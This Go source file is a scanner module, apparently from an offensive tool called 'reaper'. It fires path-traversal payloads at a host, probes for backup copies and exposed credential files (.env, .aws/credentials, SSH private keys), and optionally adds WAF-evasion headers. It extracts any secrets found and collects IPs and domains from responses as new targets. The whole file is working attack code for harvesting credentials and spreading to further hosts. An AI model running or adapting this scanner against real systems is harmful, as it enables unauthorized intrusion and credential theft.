package scanners

import (
	"fmt"
	"strings"

	"github.com/valyala/fasthttp"

	"reaper/internal/core"
	"reaper/internal/extractors"
	"reaper/internal/utils"
)

var (
	travPayloads = []string{
		"../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
		"..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd",
		"....//....//etc/passwd", "....//....//....//etc/passwd",
		"..%252f..%252fetc%252fpasswd",
		"%2e%2e/%2e%2e/etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%c0%af..%c0%afetc/passwd", "..%ef%bc%8f..%ef%bc%8fetc/passwd",
		"..\\/etc/passwd",
		"..%00/etc/passwd",
		"....\\\\....\\\\etc\\passwd",
		`..\\..\\..\\..\\windows\\win.ini`,
		`..%5c..%5c..%5cwindows%5cwin.ini`,
		"../../etc/shadow", "../../etc/hosts",
		"../../proc/self/environ",
		// PHP null-byte injection
		"../etc/passwd%00.png", "../../etc/passwd%00.jpg",
		// Tomcat / Java
		"WEB-INF/web.xml", "../WEB-INF/web.xml",
		"META-INF/context.xml",
		// Windows-specific
		`..\\..\\windows\\system32\\drivers\\etc\\hosts`,
		`..\\..\\..\\windows\\system.ini`,
	}
	bkpExts = []string{
		".bak", ".old", ".save", ".orig", ".copy", ".tmp", ".swp", "~",
		".backup", ".txt", ".dist", ".inc", ".conf", ".log", ".sql",
		".bk", ".bck", ".orig.bak", ".0",
	}
	sensFiles = []string{
		".env", ".env.local", ".env.production", ".env.backup", ".env.dev",
		"wp-config.php", "config.php", "settings.py", "local_settings.py",
		"application.yml", "application.properties",
		"database.yml", "secrets.yml", "credentials.json",
		"web.config", ".htpasswd", ".htaccess",
		"appsettings.json", "appsettings.Development.json",
		"config.json", "config.yaml", "config.toml",
		".aws/credentials", ".ssh/id_rsa", ".ssh/authorized_keys",
		"id_rsa", "id_dsa", "id_ed25519",
		".npmrc", ".pypirc", ".netrc", ".pgpass", ".my.cnf",
		"docker-compose.yml", ".dockerenv",
		"WEB-INF/web.xml", "META-INF/context.xml",
		"Procfile", "Gemfile", "Makefile",
		"firebase.json", ".firebaserc",
		"serviceAccountKey.json", "service-account.json",
		"phpinfo.php", "info.php",
		"backup.sql", "dump.sql",
	}
	sensMarkers = []string{
		"root:", "DB_PASSWORD", "SECRET_KEY", "PRIVATE KEY", "password",
		"credentials", "api_key", "[extensions]", "for 16-bit app support",
		"AKIA", "sk_live_", "mongodb://", "postgres://", "mysql://",
		"BEGIN RSA", "BEGIN EC", "BEGIN DSA", "BEGIN OPENSSH",
		"smtp_password", "SENDGRID", "MAILGUN",
		"Authorization:", "Bearer ", "Basic ",
		// Tomcat / Java markers
		"<web-app", "<Context", "docBase=",
		// Windows markers
		"[boot loader]", "[operating systems]",
	}
)

type UAFRScanner struct{ WAFEvasion bool }

func (s *UAFRScanner) Name() string { return "uafr" }

func (s *UAFRScanner) Scan(client *fasthttp.Client, host string, port int, path string, isIP bool, scheme string) *core.ScanResult {
	if port == 80 { scheme = "http" }
	base := fmt.Sprintf("%s://%s:%d", scheme, host, port)
	var h map[string]string
	if s.WAFEvasion { ch := ""; if !isIP { ch = host }; h = core.GenerateHeaders(ch) }
	var allS []extractors.Secret; var allT []string; var pResp *utils.HTTPResponse
	last := strings.LastIndex(path, "/"); part := ""; if last >= 0 && last < len(path)-1 { part = path[last+1:] }
	if strings.Contains(part, ".") {
		for _, ext := range bkpExts {
			u := base + path + ext
			r := utils.Fetch(client, u, "GET", h, 2, 150_000_000)
			if r != nil && r.Status == 200 && r.Size > 50 && utils.ContainsAny(r.Body, sensMarkers) {
				if pResp == nil { pResp = r }; allS = append(allS, extractors.ExtractSecrets(r.Body, u)...); td := extractors.ExtractAllTargets(r.Body, u); allT = append(allT, td.IPs...); allT = append(allT, td.Domains...)
			}
		}
	}
	for _, payload := range travPayloads {
		u := base + "/" + payload; r := utils.Fetch(client, u, "GET", h, 2, 150_000_000)
		if r != nil && r.Status == 200 { for _, tm := range []string{"root:", "[extensions]", "DB_PASSWORD"} { if strings.Contains(r.Body, tm) { if pResp == nil { pResp = r }; allS = append(allS, extractors.ExtractSecrets(r.Body, u)...); break } }; break }
	}
	parentDir := "/"; if last > 0 { parentDir = path[:last+1] }
	for _, fn := range sensFiles { for _, pfx := range []string{"/", parentDir} { u := base + pfx + fn; r := utils.Fetch(client, u, "GET", h, 2, 150_000_000); if r != nil && r.Status == 200 && r.Size > 20 { ss := extractors.ExtractSecrets(r.Body, u); if len(ss) > 0 { if pResp == nil { pResp = r }; allS = append(allS, ss...); td := extractors.ExtractAllTargets(r.Body, u); allT = append(allT, td.IPs...); allT = append(allT, td.Domains...) } } } }
	if pResp != nil && (len(allS) > 0 || len(allT) > 0) { return &core.ScanResult{URL: base + path, Status: pResp.Status, Scanner: s.Name(), Secrets: allS, NewTargets: uniqueStrings(allT), ResponseSize: pResp.Size} }
	return nil
}
